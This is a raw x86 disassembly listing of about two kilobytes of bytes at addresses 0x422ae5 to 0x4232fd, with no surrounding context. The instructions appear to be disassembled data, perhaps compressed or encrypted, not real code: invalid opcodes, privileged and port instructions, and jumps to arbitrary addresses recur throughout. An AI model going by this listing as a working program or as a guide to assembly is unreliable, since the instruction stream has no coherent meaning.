  422ae5:	mov    al,0xd4
  422ae7:	mov    ebx,0xa4429afd
  422aec:	shl    esi,cl
  422aee:	jo     0x422b3a
  422af0:	repnz pop edx
  422af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422af3:	sbb    dh,al
  422af5:	sub    DWORD PTR [ecx+0x37e36c94],ebp
  422afb:	jb     0x422af3
  422afd:	out    dx,al
  422afe:	je     0x422b14
  422b00:	mov    DWORD PTR [esi+0x1fafd2cf],esp
  422b06:	pop    eax
  422b07:	(bad)  
  422b09:	push   ebx
  422b0a:	cmp    al,0x7b
  422b0c:	ret    
  422b0d:	(bad)  
  422b0f:	pop    ss
  422b10:	sbb    al,0x40
  422b12:	mov    WORD PTR ds:0xffc1631b,ds
  422b18:	popa   
  422b19:	push   edi
  422b1a:	mov    ds:0x344d1254,eax
  422b1f:	lahf   
  422b20:	pop    ss
  422b21:	jno    0x422b85
  422b23:	mov    dl,0x6b
  422b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b26:	jno    0x422ad9
  422b28:	outs   dx,DWORD PTR gs:[esi]
  422b2a:	pop    esp
  422b2b:	inc    edx
  422b2c:	inc    esp
  422b2d:	mov    dh,0x74
  422b2f:	in     al,0xaf
  422b31:	xchg   ebx,eax
  422b32:	imul   BYTE PTR ds:0xdb58fb29
  422b38:	es pop esi
  422b3a:	sbb    eax,0xb5dbd39d
  422b3f:	scas   eax,DWORD PTR es:[edi]
  422b40:	push   0xf8c1b0e1
  422b45:	push   ss
  422b46:	pop    ecx
  422b47:	in     al,0x98
  422b49:	ja     0x422aed
  422b4b:	pop    ecx
  422b4c:	xchg   ebx,eax
  422b4d:	pop    es
  422b4e:	mov    DWORD PTR gs:0xbdcb1121,esi
  422b55:	pop    edi
  422b56:	ficom  DWORD PTR [eax]
  422b58:	ror    dh,cl
  422b5a:	push   ds
  422b5b:	and    BYTE PTR [edi+0x10],dl
  422b5e:	jmp    0x422b7b
  422b60:	daa    
  422b61:	mov    bh,0x73
  422b63:	ins    DWORD PTR es:[edi],dx
  422b64:	rol    BYTE PTR [eax+0x399909b1],0x4a
  422b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b6c:	inc    ebp
  422b6d:	xor    BYTE PTR ds:[eax],dl
  422b70:	lock stc 
  422b72:	stos   BYTE PTR es:[edi],al
  422b73:	jb     0x422bc3
  422b75:	and    BYTE PTR [edi],bl
  422b77:	jge    0x422b55
  422b79:	fwait
  422b7a:	mov    esi,0x4a474194
  422b7f:	imul   ecx,DWORD PTR [ecx+0x7e3c914e],0xffffffae
  422b86:	ret    0x9689
  422b89:	add    eax,0xfbce724b
  422b8e:	add    BYTE PTR [esp+eax*2],0xc0
  422b92:	repnz sub BYTE PTR [esi-0x39],0x2d
  422b97:	mov    ch,BYTE PTR [edi-0x70]
  422b9a:	add    eax,0x81d47dc8
  422b9f:	mov    edi,0xd1be3ce3
  422ba4:	pop    ebp
  422ba5:	fld    TBYTE PTR [edx+0x7492a6f3]
  422bab:	add    eax,0x10b0c634
  422bb0:	xadd   BYTE PTR [ebx+edi*8-0x308ea2dc],cl
  422bb8:	aaa    
  422bb9:	adc    eax,0x8900ad12
  422bbe:	ret    
  422bbf:	xchg   esi,eax
  422bc0:	sbb    eax,0x7682eb6a
  422bc5:	iret   
  422bc6:	jo     0x422b9f
  422bc8:	hlt    
  422bc9:	mov    eax,ds:0x311156a9
  422bce:	aas    
  422bcf:	jno    0x422b53
  422bd1:	arpl   WORD PTR [ebp+0x7028a9e8],cx
  422bd7:	rol    DWORD PTR [eax],cl
  422bd9:	fs mov edi,0x5af13172
  422bdf:	fisttp WORD PTR [eax]
  422be1:	in     eax,0x74
  422be3:	inc    edx
  422be4:	mov    ecx,0xd2c86ebd
  422be9:	mov    bl,0xae
  422beb:	pushf  
  422bec:	push   ecx
  422bed:	push   esp
  422bee:	xchg   edx,eax
  422bef:	inc    esi
  422bf0:	adc    eax,0x4333050e
  422bf5:	xor    esp,DWORD PTR [ecx-0x76]
  422bf8:	mov    ah,0x23
  422bfa:	jb     0x422bdc
  422bfc:	push   edi
  422bfd:	js     0x422ba5
  422bff:	cmp    al,0x46
  422c01:	adc    ecx,DWORD PTR [ebx]
  422c03:	fild   WORD PTR [edi+0x74]
  422c06:	pop    edi
  422c07:	(bad)  
  422c08:	fist   WORD PTR [ecx+eiz*4-0x1440e472]
  422c0f:	add    bl,ah
  422c11:	popa   
  422c12:	push   ebp
  422c13:	dec    ebp
  422c14:	call   0x7e09:0x25f52a66
  422c1b:	xchg   ecx,eax
  422c1c:	sub    esi,DWORD PTR [edi-0x364a43f2]
  422c22:	xchg   edi,eax
  422c23:	test   al,0xdd
  422c25:	bound  esp,QWORD PTR [edi+0x4ec6510c]
  422c2b:	mov    ds:0x31b61ace,eax
  422c30:	jnp    0x422c05
  422c32:	push   edx
  422c33:	ja     0x422c6a
  422c35:	in     eax,0x7c
  422c37:	mov    esp,0x491e6785
  422c3c:	sahf   
  422c3d:	das    
  422c3e:	sbb    bl,BYTE PTR [ebx-0x23]
  422c41:	ins    DWORD PTR es:[edi],dx
  422c42:	adc    al,0xe3
  422c44:	jns    0x422ca1
  422c46:	push   0xfff546ca
  422c4b:	dec    ebp
  422c4c:	sbb    eax,0x39dbc6e3
  422c51:	push   ecx
  422c52:	and    DWORD PTR [ebx+eax*1],eax
  422c55:	or     eax,0xd7602396
  422c5a:	and    dl,BYTE PTR [ebp-0x7a]
  422c5d:	sbb    DWORD PTR [edx],0xffffffaf
  422c60:	push   esp
  422c61:	xor    DWORD PTR [edx],ebp
  422c63:	add    ecx,DWORD PTR [edi+eiz*2]
  422c66:	out    0xb7,al
  422c68:	(bad)  
  422c69:	ds jmp 0xffe8:0x71d0ea7
  422c71:	push   eax
  422c72:	cmp    DWORD PTR [ebp-0x4287a322],0x2c87f530
  422c7c:	adc    al,0xd5
  422c7e:	shl    ch,cl
  422c80:	popa   
  422c81:	sbb    BYTE PTR [eax-0x24d435a8],dl
  422c87:	xchg   esp,eax
  422c88:	inc    ebx
  422c89:	mov    ah,bl
  422c8b:	jo     0x422c9c
  422c8d:	(bad)  
  422c8e:	aam    0x4e
  422c90:	add    eax,0x8b003819
  422c95:	psubsb mm1,QWORD PTR [esi-0x3ade7e5a]
  422c9c:	int    0x3c
  422c9e:	outs   dx,DWORD PTR ds:[esi]
  422c9f:	pusha  
  422ca0:	mov    cl,0xe0
  422ca2:	in     al,0x48
  422ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ca5:	add    bh,BYTE PTR [ecx-0x2545db60]
  422cab:	fadd   DWORD PTR [esi+0x22]
  422cae:	adc    cl,BYTE PTR [edx-0x528a4644]
  422cb4:	fisttp DWORD PTR [eax+0x43]
  422cb7:	mov    dl,0xba
  422cb9:	add    esp,esi
  422cbb:	mov    eax,ds:0x1438c9e4
  422cc0:	jl     0x422ca7
  422cc2:	pushf  
  422cc3:	jecxz  0x422cfd
  422cc5:	nop
  422cc6:	add    eax,0x318ca09c
  422ccb:	call   0x6a63e85b
  422cd0:	mov    cl,0x49
  422cd2:	mov    edx,0xd8c0561b
  422cd7:	sub    DWORD PTR [edx],0x70
  422cda:	xchg   DWORD PTR [ebx-0x56],edx
  422cdd:	sbb    bl,bh
  422cdf:	push   ebx
  422ce0:	xlat   BYTE PTR ds:[ebx]
  422ce1:	inc    edx
  422ce2:	mov    ebp,0x31677394
  422ce7:	cmp    dh,dh
  422ce9:	scas   eax,DWORD PTR es:[edi]
  422cea:	loop   0x422cb6
  422cec:	das    
  422ced:	push   ecx
  422cee:	mov    edx,0x758cfa
  422cf3:	cmp    cl,cl
  422cf5:	add    eax,0x3b895550
  422cfa:	push   esp
  422cfb:	leave  
  422cfc:	leave  
  422cfd:	jge    0x422d13
  422cff:	inc    ecx
  422d00:	loop   0x422ca0
  422d02:	sar    BYTE PTR [ecx-0x3fde15be],1
  422d08:	push   0x58ad9afe
  422d0d:	jl     0x422d31
  422d0f:	nop
  422d10:	loopne 0x422d30
  422d12:	push   0xf4eb6f53
  422d17:	jge    0x422d7c
  422d19:	dec    ecx
  422d1a:	xchg   BYTE PTR [ecx+0x22fd060d],dh
  422d20:	fisub  DWORD PTR [ebx+0x2c83ff10]
  422d26:	sbb    ebp,esp
  422d28:	loop   0x422d66
  422d2a:	popf   
  422d2b:	xchg   edi,eax
  422d2c:	pushf  
  422d2d:	je     0x422d3f
  422d2f:	mov    dh,0xa
  422d31:	pop    edx
  422d32:	ja     0x422d15
  422d34:	sub    DWORD PTR [ebx-0x2f7a079c],edx
  422d3a:	pop    ebp
  422d3b:	cmp    BYTE PTR [edx-0x30],cl
  422d3e:	(bad)  
  422d3f:	aam    0x52
  422d41:	dec    ebp
  422d42:	cmp    BYTE PTR [edi+edi*8-0x4c],dh
  422d46:	adc    eax,0x427424f2
  422d4b:	aad    0x57
  422d4d:	xchg   edx,eax
  422d4e:	xor    esi,edx
  422d50:	mov    eax,0x5c1ae4ae
  422d55:	cdq    
  422d56:	cld    
  422d57:	gs jae 0x422d88
  422d5a:	and    eax,0x57d5b609
  422d5f:	stos   DWORD PTR es:[edi],eax
  422d60:	xor    al,0xb5
  422d62:	loop   0x422cf0
  422d64:	xor    al,bh
  422d66:	pop    ebp
  422d67:	cmp    eax,0x82881dad
  422d6c:	and    eax,0x5dd9c4d3
  422d71:	test   eax,edi
  422d73:	pop    ebp
  422d74:	aad    0xb4
  422d76:	aad    0x81
  422d78:	cs cld 
  422d7a:	dec    ebx
  422d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d7c:	mov    dl,BYTE PTR [edi+eiz*1-0x239f562b]
  422d83:	(bad)  
  422d85:	adc    esp,edi
  422d87:	and    al,0x4c
  422d89:	dec    ebp
  422d8a:	xlat   BYTE PTR ds:[ebx]
  422d8b:	ja     0x422d2d
  422d8d:	push   ds
  422d8e:	loop   0x422d99
  422d90:	in     eax,0xed
  422d92:	sbb    eax,0x28800bca
  422d97:	std    
  422d98:	jnp    0x422d78
  422d9a:	out    dx,al
  422d9b:	push   eax
  422d9c:	jecxz  0x422d24
  422d9e:	addr16 nop
  422da0:	jle    0x422dda
  422da2:	(bad)  
  422da3:	jmp    0x358c:0x5654695a
  422daa:	(bad)  
  422dab:	hlt    
  422dac:	adc    eax,0xed831338
  422db1:	fist   WORD PTR [ecx]
  422db3:	add    DWORD PTR [eax+0x2e],ebx
  422db6:	sbb    edi,DWORD PTR [ebp-0x69]
  422db9:	(bad)  
  422dbb:	cmp    eax,0xde3de547
  422dc0:	sub    eax,ebx
  422dc2:	les    edx,FWORD PTR [edi+0x196012b2]
  422dc8:	mov    bl,0xf9
  422dca:	rol    edx,cl
  422dcc:	adc    al,0x46
  422dce:	inc    eax
  422dcf:	call   0x945962f9
  422dd4:	pop    edi
  422dd5:	mov    ds:0x872b92e0,al
  422dda:	mov    ah,0xb7
  422ddc:	mov    dl,0xe1
  422dde:	shl    BYTE PTR [ebx*1+0x4f3c75ea],1
  422de5:	mov    ch,0x7
  422de7:	test   DWORD PTR [esi-0x66],ebp
  422dea:	pop    edx
  422deb:	imul   DWORD PTR [edi+0x2d]
  422dee:	jmp    0x422e5f
  422df0:	mov    ch,0x4b
  422df2:	cmp    al,0xd6
  422df4:	cli    
  422df5:	fcomip st,st(7)
  422df7:	imul   ebx,DWORD PTR [ecx+0xe],0x0
  422dfb:	mov    ?,WORD PTR [edx+0x2bf24130]
  422e01:	out    dx,al
  422e02:	dec    ecx
  422e03:	xchg   edi,eax
  422e04:	pop    esp
  422e05:	call   0x12c99e61
  422e0a:	frstor [esi+0x4a]
  422e0d:	lock sbb al,0xe
  422e10:	mov    dl,0x16
  422e12:	js     0x422e28
  422e14:	sti    
  422e15:	scas   eax,DWORD PTR es:[edi]
  422e16:	add    DWORD PTR [esi+0x5eb3d44f],ebp
  422e1c:	clc    
  422e1d:	sub    dh,BYTE PTR [esi]
  422e1f:	xchg   ecx,eax
  422e20:	and    dl,BYTE PTR [eax]
  422e22:	enter  0xe838,0x84
  422e26:	mov    BYTE PTR [eax-0x7c],0xc5
  422e2a:	fst    DWORD PTR [eax]
  422e2c:	sti    
  422e2d:	add    eax,0x128bb3c3
  422e32:	cwde   
  422e33:	sbb    eax,0xc5989c25
  422e38:	jmp    0x422e96
  422e3a:	jmp    0x422e1c
  422e3c:	cwde   
  422e3d:	jmp    0x422eba
  422e3f:	mov    eax,ds:0xc2ee9e02
  422e44:	int3   
  422e45:	jmp    0x4e2f01d5
  422e4a:	jo     0x422e1c
  422e4c:	in     al,dx
  422e4d:	stos   DWORD PTR es:[edi],eax
  422e4e:	dec    ebp
  422e4f:	fsub   DWORD PTR ds:0xe63e5479
  422e55:	mov    esi,0x83296547
  422e5a:	data16 cmp al,BYTE PTR [ebx-0x3c]
  422e5e:	add    eax,0x229d77bd
  422e63:	jmp    0xf7c39edc
  422e68:	and    BYTE PTR [esi],bh
  422e6a:	and    al,0xe0
  422e6c:	add    ch,BYTE PTR [eax]
  422e6e:	mov    ecx,0xc93a9d3b
  422e73:	cs sahf 
  422e75:	scas   eax,DWORD PTR es:[edi]
  422e76:	test   DWORD PTR [ebp+0x50864ab3],0x7c0e5489
  422e80:	sahf   
  422e81:	clc    
  422e82:	push   ds
  422e83:	(bad)  
  422e84:	cmp    DWORD PTR [edi-0x1],edx
  422e87:	imul   ecx,DWORD PTR [edi],0xb88b40bd
  422e8d:	mov    edi,esi
  422e8f:	add    DWORD PTR [edx],edi
  422e91:	repnz sub cl,BYTE PTR [ebx*8+0x534034d1]
  422e99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e9a:	int3   
  422e9b:	or     al,0xcb
  422e9d:	jmp    0x2d5e:0x644ba12c
  422ea4:	adc    DWORD PTR [esi+0x309bb689],ebx
  422eaa:	stos   BYTE PTR es:[edi],al
  422eab:	inc    esi
  422eac:	mov    esi,0x95db83c4
  422eb1:	mov    eax,0x9eb249e3
  422eb6:	jbe    0x422eb5
  422eb8:	mov    dh,0xe5
  422eba:	int    0x7c
  422ebc:	push   eax
  422ebd:	push   edx
  422ebe:	xlat   BYTE PTR ds:[ebx]
  422ebf:	sbb    ah,BYTE PTR [eax+esi*4+0x3e]
  422ec3:	mov    esi,0xd16bd3ed
  422ec8:	or     ah,ch
  422eca:	dec    esi
  422ecb:	test   BYTE PTR [eax],ah
  422ecd:	add    BYTE PTR [esp+eax*8-0x39],bl
  422ed1:	mov    esi,0x23058032
  422ed6:	dec    esp
  422ed7:	sub    eax,0xee5d33b2
  422edc:	hlt    
  422edd:	je     0x422e8c
  422edf:	mov    cl,0x9c
  422ee1:	mov    edi,0x90337ba9
  422ee6:	sub    eax,0xba0ebf5a
  422eeb:	adc    ch,BYTE PTR [esi+0x7b]
  422eee:	inc    eax
  422eef:	loop   0x422f53
  422ef1:	or     ebp,esp
  422ef3:	lahf   
  422ef4:	and    al,0x2a
  422ef6:	ret    
  422ef7:	add    ch,BYTE PTR [eax]
  422ef9:	mov    BYTE PTR [ebx+0x5ba91c92],bl
  422eff:	mov    dh,0xad
  422f01:	sbb    al,0x6c
  422f03:	addr16 js 0x422f7b
  422f06:	jnp    0x422f4b
  422f08:	inc    ebp
  422f09:	sub    al,0x78
  422f0b:	mov    cl,0x5d
  422f0d:	jb     0x422f79
  422f0f:	sub    ecx,DWORD PTR [ebx+eax*4+0x41]
  422f13:	std    
  422f14:	push   esi
  422f15:	jnp    0x422ea2
  422f17:	add    DWORD PTR [esi-0x23],ebp
  422f1a:	mov    ebp,0xbb4e5a5d
  422f1f:	pop    ebp
  422f20:	wrmsr  
  422f22:	mov    edi,DWORD PTR [edx+edx*1-0x36a4350a]
  422f29:	in     al,0xf2
  422f2b:	outs   dx,BYTE PTR ds:[esi]
  422f2c:	mov    bh,0xbd
  422f2e:	and    al,0x6d
  422f30:	sub    ebx,DWORD PTR [edx+0x78]
  422f33:	pop    es
  422f34:	mov    al,0x64
  422f36:	aas    
  422f37:	in     al,0x4f
  422f39:	xor    BYTE PTR [esi],dh
  422f3b:	mov    ah,0xeb
  422f3d:	fmul   DWORD PTR [ebx]
  422f3f:	stos   BYTE PTR es:[edi],al
  422f40:	mov    bl,0x51
  422f42:	push   edx
  422f43:	or     eax,0xc773f162
  422f48:	jg     0x422f96
  422f4a:	repz pushf 
  422f4c:	or     esi,DWORD PTR [edx-0x7c004fe7]
  422f52:	hlt    
  422f53:	mov    ebp,ecx
  422f55:	mov    ah,0x7
  422f57:	(bad)  
  422f58:	into   
  422f59:	fstp   TBYTE PTR [edi]
  422f5b:	push   ebp
  422f5c:	out    0x6f,eax
  422f5e:	sbb    dh,0xfe
  422f61:	aam    0x5a
  422f63:	cld    
  422f64:	xchg   edx,eax
  422f65:	pop    edx
  422f66:	push   edi
  422f67:	ja     0x422f9c
  422f69:	and    bl,BYTE PTR [ecx-0x77]
  422f6c:	rcr    ah,0xa3
  422f6f:	in     eax,0xd2
  422f71:	xchg   esi,eax
  422f72:	call   0xaa9e14e1
  422f77:	pop    es
  422f78:	jns    0x422f81
  422f7a:	adc    edx,DWORD PTR [edi-0x787bc38f]
  422f80:	cdq    
  422f81:	nop
  422f82:	adc    edx,DWORD PTR [esi-0x5a]
  422f85:	add    DWORD PTR [ebp+esi*1+0x4fe2dcc9],eax
  422f8c:	sub    ch,BYTE PTR [edx]
  422f8e:	or     al,0xa3
  422f90:	popa   
  422f91:	loope  0x422fdd
  422f93:	mov    edx,0xc22205a4
  422f98:	inc    esp
  422f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f9a:	retf   0x8010
  422f9d:	out    dx,al
  422f9e:	push   eax
  422f9f:	mov    WORD PTR [ebp+0x26],es
  422fa2:	add    esp,esi
  422fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fa5:	cli    
  422fa6:	cmp    BYTE PTR [ecx+0x54],cl
  422fa9:	adc    BYTE PTR [ebp+esi*8+0x3ec51ca9],ah
  422fb0:	jae    0x422f7c
  422fb2:	push   0xadf7052e
  422fb7:	mov    esi,0xb032d832
  422fbc:	cmp    al,0xbe
  422fbe:	scas   al,BYTE PTR es:[edi]
  422fbf:	(bad)  [edx+0x37]
  422fc2:	test   BYTE PTR [esi],al
  422fc4:	pop    ebp
  422fc5:	inc    esi
  422fc6:	push   esp
  422fc7:	sti    
  422fc8:	in     al,0x3a
  422fca:	lds    esi,FWORD PTR [esi-0x23bd774a]
  422fd0:	mov    bh,0x6e
  422fd2:	pop    ecx
  422fd3:	cmp    eax,0xd99a0684
  422fd8:	xor    BYTE PTR [eax+eax*1],al
  422fdb:	push   ss
  422fdc:	out    0x52,ax
  422fdf:	mov    ds,WORD PTR [edi]
  422fe1:	in     al,dx
  422fe2:	mov    esp,0x99689de6
  422fe7:	mov    bl,0x73
  422fe9:	and    ebx,DWORD PTR ds:0xe3d2e093
  422fef:	pop    es
  422ff0:	push   ebx
  422ff1:	ret    
  422ff2:	dec    esi
  422ff3:	push   cs
  422ff4:	jmp    DWORD PTR [esi]
  422ff6:	dec    esp
  422ff7:	mov    esp,0x9bc55fca
  422ffc:	bound  eax,QWORD PTR [edi]
  422ffe:	mov    ecx,0xf7192283
  423003:	repnz fld TBYTE PTR [eax-0x3f]
  423007:	and    edx,edi
  423009:	sbb    eax,esp
  42300b:	sbb    esp,DWORD PTR [edi]
  42300d:	dec    ebx
  42300e:	repz clc 
  423010:	mov    bl,0x55
  423012:	jecxz  0x423014
  423014:	(bad)  
  423015:	shr    BYTE PTR [esi+0x4e],cl
  423018:	aaa    
  423019:	popa   
  42301a:	add    dh,0x89
  42301d:	cmp    eax,0x1daa3419
  423022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423023:	sub    al,BYTE PTR [eax-0x3b61fd96]
  423029:	call   0x367a6847
  42302e:	push   ss
  42302f:	xchg   DWORD PTR [eax+0x132bf307],ebx
  423035:	repz bound eax,QWORD PTR [esi+0x1]
  423039:	sub    ebp,ebx
  42303b:	adc    al,0xc
  42303d:	and    DWORD PTR fs:[edx],0x17
  423041:	shr    BYTE PTR [edx],0xf6
  423044:	jmp    0x42305a
  423046:	lods   al,BYTE PTR ds:[esi]
  423047:	nop
  423048:	mov    bl,0xcf
  42304a:	fs cmp eax,0xab7b5ff6
  423050:	mov    dl,0xf1
  423052:	mov    bl,0xf0
  423054:	mov    dl,0x54
  423056:	aad    0x9
  423058:	push   edi
  423059:	xchg   esi,eax
  42305a:	pusha  
  42305b:	add    al,BYTE PTR [esi-0x50]
  42305e:	movzx  ecx,WORD PTR gs:[ecx]
  423062:	test   BYTE PTR [ebx],ah
  423064:	adc    eax,0x9eb81ace
  423069:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42306b:	stos   DWORD PTR es:[edi],eax
  42306c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42306d:	aaa    
  42306e:	fiadd  DWORD PTR [edi]
  423070:	inc    eax
  423071:	adc    eax,0x15b52562
  423076:	adc    eax,0x7b66dd8
  42307b:	inc    esi
  42307c:	fcmovnb st,st(5)
  42307e:	or     DWORD PTR [edi],edi
  423080:	xor    bl,BYTE PTR [edi-0x21]
  423083:	push   edx
  423085:	mov    edi,0x5a35fc34
  42308a:	fs call 0xeabb3c39
  423090:	and    DWORD PTR [edi-0x61],0xfffffff0
  423094:	shl    BYTE PTR [edx],0xc0
  423097:	cmp    eax,0x21d4a7b4
  42309c:	or     ah,ah
  42309e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42309f:	mov    ebx,0xfa4ab6a
  4230a4:	rol    BYTE PTR ds:[eax],cl
  4230a7:	xchg   esp,eax
  4230a8:	jmp    0xab443619
  4230ad:	(bad)  [eax]
  4230af:	ficom  DWORD PTR [ebx+0x19]
  4230b2:	mov    ebx,DWORD PTR [ebx+0x5bfcf5d0]
  4230b8:	loopne 0x4230bb
  4230ba:	mov    edi,edx
  4230bc:	fnstenv [esi+0x521859bf]
  4230c2:	xor    ch,BYTE PTR [esi+0x58a93125]
  4230c8:	and    dh,BYTE PTR [edx+esi*8+0x4a]
  4230cc:	mov    edi,0x80a58b52
  4230d1:	addr16 mov ecx,0x32ebf78f
  4230d7:	push   ds
  4230d8:	test   BYTE PTR [ebx-0x6f0ef725],bh
  4230de:	xchg   ebp,eax
  4230df:	aam    0xdc
  4230e1:	aam    0xf4
  4230e3:	sar    BYTE PTR [eax+ebx*2],0xdb
  4230e7:	xor    al,0x12
  4230e9:	cmp    BYTE PTR [ecx],0x97
  4230ec:	push   esp
  4230ed:	xlat   BYTE PTR ds:[ebx]
  4230ee:	addr16 mov edx,0xfd6279a1
  4230f4:	(bad)  
  4230f6:	xor    ebp,DWORD PTR [edi+esi*2+0x58]
  4230fa:	mov    ebp,0x408aa7d8
  4230ff:	xchg   DWORD PTR [ecx+0x7564fa1],edx
  423105:	rcl    al,0x4a
  423108:	sbb    BYTE PTR [esi-0x17],al
  42310b:	push   es
  42310c:	and    ch,dl
  42310e:	loop   0x42309b
  423110:	aam    0x81
  423112:	iret   
  423113:	out    dx,al
  423114:	jmp    0x4230e1
  423116:	rcr    DWORD PTR [esp+edi*2],cl
  423119:	sub    BYTE PTR ds:0xfdb8ebf4,cl
  42311f:	mov    bl,0xde
  423121:	sub    bh,0x4a
  423124:	dec    eax
  423125:	in     al,dx
  423126:	dec    ebp
  423127:	jne    0x4230fa
  423129:	std    
  42312a:	sub    dh,BYTE PTR [esi-0x41]
  42312d:	aad    0x78
  42312f:	rcr    cl,1
  423131:	ja     0x4230e8
  423133:	scas   eax,DWORD PTR es:[edi]
  423134:	fidiv  WORD PTR [ebx-0xc]
  423137:	cwde   
  423138:	pop    eax
  423139:	gs mov dl,0xcc
  42313c:	pop    ebp
  42313d:	sti    
  42313e:	clc    
  42313f:	adc    ebp,edi
  423141:	adc    BYTE PTR [edx+ebp*4],ch
  423144:	fs and al,0x0
  423147:	out    0x77,al
  423149:	cli    
  42314a:	push   edi
  42314b:	xor    al,bh
  42314d:	popa   
  42314e:	mov    al,0xd4
  423150:	pop    edi
  423151:	xchg   edx,eax
  423152:	nop
  423153:	inc    esi
  423154:	mov    al,0x7
  423156:	call   FWORD PTR [esi-0x2f]
  423159:	lods   al,BYTE PTR ds:[esi]
  42315a:	dec    ebp
  42315b:	mov    dl,0xac
  42315d:	dec    ebx
  42315e:	aad    0x72
  423160:	lea    ebx,[esp+ebx*8]
  423163:	inc    ebp
  423164:	pop    DWORD PTR [ecx-0x13]
  423167:	rcl    DWORD PTR [edi],cl
  423169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42316a:	sub    BYTE PTR [ebp-0x2c],cl
  42316d:	xor    ecx,DWORD PTR [ebp-0x750b41f8]
  423173:	pop    edx
  423174:	dec    ch
  423176:	sbb    al,0x36
  423178:	adc    al,0x5
  42317a:	mov    WORD PTR [edi],gs
  42317c:	ins    BYTE PTR es:[edi],dx
  42317d:	lock shl BYTE PTR [edi+0x6f],1
	...
  4231c9:	sbb    DWORD PTR [edi+ecx*8-0x1],esi
  4231cd:	out    dx,eax
  4231ce:	(bad)  
  4231cf:	cmp    esi,esi
  4231d1:	repnz sahf 
  4231d3:	mov    ebx,0x2e5cb423
  4231d8:	loope  0x423235
  4231da:	sbb    al,BYTE PTR [ecx]
  4231dc:	add    BYTE PTR [eax],ah
  4231de:	pop    es
  4231df:	add    BYTE PTR [eax],al
  4231e1:	outs   dx,BYTE PTR ds:[esi]
  4231e2:	push   DWORD PTR [eax+eiz*8+0x69]
  4231e6:	mov    edi,0x30ffe58d
  4231eb:	add    BYTE PTR [ebp+0x46],ah
  4231ee:	mov    esp,0x1fc74e0d
  4231f3:	imul   esp,DWORD PTR [edi],0xffffffe2
  4231f6:	out    0xe,eax
  4231f8:	push   edi
  4231f9:	sub    al,0xcc
  4231fb:	enter  0xe44c,0xfe
  4231ff:	std    
  423200:	xchg   edx,eax
  423201:	cli    
  423202:	sbb    ah,BYTE PTR [eax+0x50]
  423205:	ss jge 0x423190
  423208:	add    DWORD PTR [ebx+eax*2],eax
  42320b:	mov    es,WORD PTR [edx-0x7f]
  42320e:	or     dl,BYTE PTR [eax+eiz*2+0x54]
  423212:	mov    cl,0x7b
  423214:	sub    bl,BYTE PTR [esi+0x4d48240b]
  42321a:	pop    eax
  42321b:	pushf  
  42321c:	cli    
  42321d:	nop
  42321e:	test   al,0x95
  423220:	out    dx,al
  423221:	lds    ebx,FWORD PTR [ebp-0x54d64df3]
  423227:	and    eax,0x9070c54d
  42322c:	shr    BYTE PTR [edx],1
  42322e:	inc    esp
  42322f:	cmc    
  423230:	jbe    0x423203
  423232:	fild   DWORD PTR [ecx+0x40]
  423235:	pop    edi
  423236:	xor    esi,DWORD PTR [edi]
  423238:	mov    ecx,0xbe813c8f
  42323d:	mov    BYTE PTR [ecx+0x1da92485],0x3c
  423244:	sbb    al,0x49
  423246:	shl    BYTE PTR [esi],1
  423248:	in     ax,0x8c
  42324b:	xchg   DWORD PTR [eax+eax*8-0x77078d3f],ebx
  423252:	push   edi
  423253:	aam    0xdd
  423255:	ins    BYTE PTR es:[edi],dx
  423256:	and    BYTE PTR ds:0xa64034aa,al
  42325c:	call   0x399d519
  423261:	pusha  
  423262:	mov    edx,0xa323dad7
  423267:	pop    ebp
  423268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42326a:	cmp    BYTE PTR [ebx-0x35],dl
  42326d:	test   BYTE PTR [edi-0x28],cl
  423270:	mov    ebx,0x665b8a15
  423275:	ds jecxz 0x4232f1
  423278:	imul   eax,DWORD PTR [ebx-0x1c],0xffffff85
  42327c:	cli    
  42327d:	loop   0x423288
  42327f:	inc    ebp
  423280:	cmp    BYTE PTR [ebx-0x57],0x16
  423284:	scas   eax,DWORD PTR es:[edi]
  423285:	xor    al,0x87
  423287:	or     eax,0x5f4869af
  42328c:	pushf  
  42328d:	adc    BYTE PTR [eax],ah
  42328f:	mov    esi,DWORD PTR [esp+edi*8]
  423292:	xor    al,0x31
  423294:	adc    esi,DWORD PTR [edi+0x39]
  423297:	lock mov dl,0x59
  42329a:	xor    DWORD PTR [esi],0x7b
  42329d:	xchg   BYTE PTR [eax],al
  42329f:	rol    BYTE PTR [ebp-0x1e],0xbd
  4232a3:	mov    esi,0x46299150
  4232a8:	cmp    eax,0xe598d924
  4232ad:	out    0x89,al
  4232af:	jge    0x423234
  4232b1:	pop    edi
  4232b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232b3:	retf   
  4232b4:	xor    BYTE PTR [edx-0x3e],ch
  4232b7:	imul   edi,DWORD PTR [edi+0x10],0x23
  4232bb:	or     dl,BYTE PTR [ebp-0x32]
  4232be:	cmp    DWORD PTR [ecx-0x5b],0xa54d7e6
  4232c5:	cs xchg edx,eax
  4232c7:	and    dl,BYTE PTR ds:0x36040080
  4232cd:	push   esp
  4232ce:	cmc    
  4232cf:	xor    cl,cl
  4232d1:	repnz in eax,0x68
  4232d4:	and    BYTE PTR [ebp-0x4d],bh
  4232d7:	in     eax,dx
  4232d8:	inc    esp
  4232d9:	inc    ebp
  4232da:	lea    esi,[eax-0x359b7d2a]
  4232e0:	sahf   
  4232e1:	xor    al,0x48
  4232e3:	jo     0x423296
  4232e5:	inc    edx
  4232e6:	fadd   QWORD PTR [ebp-0x48c8618d]
  4232ec:	jl     0x423305
  4232ee:	push   0xffffffdb
  4232f0:	adc    al,0x4d
  4232f2:	ret    
  4232f3:	and    edi,DWORD PTR [eax+0x28]
  4232f6:	pop    es
  4232f7:	(bad)  
  4232f8:	mov    ebp,0xe9d03821
  4232fd:	mov    dh,0x9d
